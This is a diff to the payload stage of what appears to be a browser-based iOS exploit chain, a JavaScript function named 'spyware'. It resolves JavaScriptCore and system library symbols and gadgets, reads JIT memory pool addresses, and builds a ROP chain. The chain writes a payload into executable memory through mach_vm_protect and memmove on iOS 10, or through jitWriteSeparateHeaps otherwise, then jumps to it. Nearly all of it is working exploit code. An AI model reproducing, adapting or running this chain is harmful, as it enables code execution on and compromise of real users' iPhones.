@@ -208,7 +208,11 @@ function spyware(stage1, memory, binary)
         "/usr/lib/system/libsystem_platform.dylib":                             ["__longjmp", "__platform_memmove"],
         "/usr/lib/system/libsystem_kernel.dylib":                               ["_mach_task_self_", "__kernelrpc_mach_vm_protect_trap"],
         "/usr/lib/system/libsystem_c.dylib":                                    ["_usleep"],
-        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   ["__ZN3JSC30endOfFixedExecutableMemoryPoolE"],
+        "/System/Library/Frameworks/JavaScriptCore.framework/JavaScriptCore":   [
+            "__ZN3JSC32startOfFixedExecutableMemoryPoolE",
+            "__ZN3JSC30endOfFixedExecutableMemoryPoolE",
+            "__ZN3JSC29jitWriteSeparateHeapsFunctionE",
+        ],
     };
 
     var opcodes;
@@ -247,7 +251,7 @@ function spyware(stage1, memory, binary)
             "/usr/lib/libc++.1.dylib",  // ldrx8, regloader, movx4, stackloader
         ];
     }
-    //alert('lookin through cache');
+    alert('lookin through cache');
 
     var syms = {};
     var gadgets = {};
@@ -363,7 +367,7 @@ function spyware(stage1, memory, binary)
         }
     }
 
-    //alert('all gadgets found')
+    alert('all gadgets found')
     var longjmp             = syms["__longjmp"];
     var regloader           = gadgets["regloader"];
     var dispatch            = gadgets["dispatch"];
@@ -376,7 +380,9 @@ function spyware(stage1, memory, binary)
     var mach_vm_protect     = syms["__kernelrpc_mach_vm_protect_trap"];
     var memmove             = syms["__platform_memmove"];
     var usleep              = syms["_usleep"];
+    var memPoolStart        = memory.readInt64(syms["__ZN3JSC32startOfFixedExecutableMemoryPoolE"]);
     var memPoolEnd          = memory.readInt64(syms["__ZN3JSC30endOfFixedExecutableMemoryPoolE"]);
+    var jitWriteSeparateHeaps = memory.readInt64(syms["__ZN3JSC29jitWriteSeparateHeapsFunctionE"]);
 
     // This is easier than Uint32Array and dividing offset all the time
     binary.u32 = _u32;
@@ -672,37 +678,42 @@ function spyware(stage1, memory, binary)
         )
     }
 
-    // FIXME(stek): returns '(os/kern) protection failure' on ios 11.2?
-    add_call(mach_vm_protect,
-        // mach_task_self_,    // task
-        // codeAddr,           // addr
-        // shsz,               // size
-        new Int64(0xdeadbee0),
-        new Int64(0xdeadbee1),
-        new Int64(0xdeadbee3),
-        new Int64(0),       // max flag
-        new Int64(7)        // prot
+    if (/iPhone OS 10_/.test(navigator.userAgent)) {
+        add_call(mach_vm_protect
+            , mach_task_self_    // task
+            , codeAddr           // addr
+            , shsz               // size
+            , new Int64(0)       // max flag
+            , new Int64(7)       // prot
+        );
 
-        // for debugging return value
-        //, gadgets["ldrx0x0"]
+        add_call(memmove
+            , codeAddr           // dst
+            , paddr              // src
+            , shsz               // size
+        );
+    } else {
+        if (jitWriteSeparateHeaps != '0x0000000000000000') {
+            add_call(jitWriteSeparateHeaps
+                , Sub(codeAddr, memPoolStart)     // off
+                , paddr                           // src
+                , shsz                            // size
+            );
+        } else {
+            fail('bi0nic (c)');
+        }
+    }
+
+    add_call(usleep
+        , new Int64(100000) // microseconds
     );
 
-    add_call(memmove,
-        codeAddr,           // dst
-        paddr,              // src
-        shsz                // size
-    );
-
-    add_call(usleep,
-        new Int64(100000), // microseconds
-        null, null, null, null, null,
-        jmpAddr
-    );
+    add_call(jmpAddr);
 
     // dummy
     for(var i = 0; i < 0x20; ++i)
     {
-        arr[pos++] = 0xdeadc0de;
+        arr[pos++] = 0xde00c0de + (i<<16);
     }
 
     var sp = Add(stack, (arrsz - off) * 4);
